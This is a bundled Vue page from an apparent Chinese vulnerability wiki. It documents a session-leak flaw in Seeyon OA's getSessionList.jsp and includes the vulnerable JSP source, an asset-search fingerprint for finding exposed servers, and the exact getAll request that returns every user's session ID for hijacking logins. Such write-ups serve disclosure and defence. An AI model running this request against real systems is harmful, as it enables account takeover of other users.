import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as s,e as t}from"./app-58e4a7d6.js";const n={},a=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>未知</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;致远互联-OA&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>出现漏洞的源码</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;%@ page contentType=&quot;text/html;charset=GBK&quot;%&gt;
&lt;%@ page session= &quot;false&quot; %&gt;
&lt;%@ page import=&quot;net.btdz.oa.ext.https.*&quot;%&gt;
&lt;%
    String reqType = request.getParameter(&quot;cmd&quot;);
    String outXML = &quot;&quot;;
    boolean allowHttps = true;
    if(&quot;allowHttps&quot;.equalsIgnoreCase(reqType)){
        //add code to judge whether it allow https or not
        allowHttps = FetchSessionList.checkHttps();
        if (allowHttps) response.setHeader(&quot;AllowHttps&quot;,&quot;1&quot;);
    }
    if(&quot;getAll&quot;.equalsIgnoreCase(reqType)){
        outXML = FetchSessionList.getXMLAll();
    }
    else if(&quot;getSingle&quot;.equalsIgnoreCase(reqType)){
        String sessionId = request.getParameter(&quot;ssid&quot;);
        if(sessionId != null){
            outXML = FetchSessionList.getXMLBySessionId(sessionId);
        }
    }
    else{
        outXML += &quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;GB2312\\&quot;?&gt;\\r\\n&quot;;
        outXML += &quot;&lt;SessionList&gt;\\r\\n&quot;;
//        outXML += &quot;&lt;Session&gt;\\r\\n&quot;;
//        outXML += &quot;&lt;/Session&gt;\\r\\n&quot;;
        outXML += &quot;&lt;/SessionList&gt;\\r\\n&quot;;
    }
    out.println(outXML);
%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>从上面的代码可知，当cmd参数为getAll时，便可获取到所有用户的SessionID ,请求</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/yyoa/ext/https/getSessionList.jsp?cmd=getAll
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>回显Session则存在漏洞</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201538850.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过替换 Session即可登陆系统</p>`,14),l=[a];function d(o,r){return i(),s("div",null,l)}const v=e(n,[["render",d],["__file","致远OA getSessionList.jsp Session泄漏漏洞.html.vue"]]);export{v as default};
